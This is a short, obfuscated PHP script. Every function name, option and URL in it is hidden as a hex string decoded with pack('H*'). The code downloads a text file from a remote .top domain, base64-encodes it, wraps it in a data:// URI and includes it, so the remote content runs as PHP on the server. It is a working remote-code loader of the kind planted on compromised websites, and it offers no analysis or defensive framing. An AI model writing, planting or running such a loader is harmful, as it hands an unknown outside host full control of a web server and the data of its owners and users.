<?php
function x($h){return pack('H*',$h);}
$fmtmde = x("6375726c5f696e6974");
$bzzqjhx = x("6375726c5f7365746f7074");
$xptj = x("6375726c5f65786563");
$pjffcfa = x("6375726c5f636c6f7365");
$bdvlhr = x("6261736536345f656e636f6465");
$rrrw = constant(x("4355524c4f50545f55524c"));
$ltmfz = constant(x("4355524c4f50545f52455455524e5452414e53464552"));

$xuxw = x("68747470733a2f2f616d706e796170756e79616b752e746f702f746f6f6c732f732d6d656469612f6d656469612d76342e747874");

$xnoyr = $fmtmde();
$bzzqjhx($xnoyr, $rrrw, $xuxw);
$bzzqjhx($xnoyr, $ltmfz, true);
$ekgsxj = $xptj($xnoyr);
$pjffcfa($xnoyr);

if(!$ekgsxj) exit('Network error');

$xcnxlo = $bdvlhr($ekgsxj);
$vbfqtfm = x("646174613a2f2f746578742f706c61696e3b6261736536342c") . $xcnxlo;
include $vbfqtfm;
